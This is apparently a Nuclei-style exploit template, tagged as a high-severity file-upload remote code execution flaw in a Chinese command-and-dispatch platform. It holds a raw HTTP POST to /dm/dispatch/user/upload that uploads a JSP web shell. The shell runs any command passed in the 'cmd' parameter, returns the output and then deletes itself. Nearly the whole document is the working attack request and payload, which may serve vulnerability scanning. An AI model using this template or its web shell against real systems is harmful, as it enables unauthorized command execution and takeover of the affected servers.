info:
  name: 可视化融合指挥调度平台 upload 存在文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,file-upload,2026
http:
- raw:
  - 'POST /dm/dispatch/user/upload HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp


    ------WebKitFormBoundary7ctER307B0RaQwOp

    Content-Disposition: form-data; name="file";filename="1.jsp"


    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundary7ctER307B0RaQwOp--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
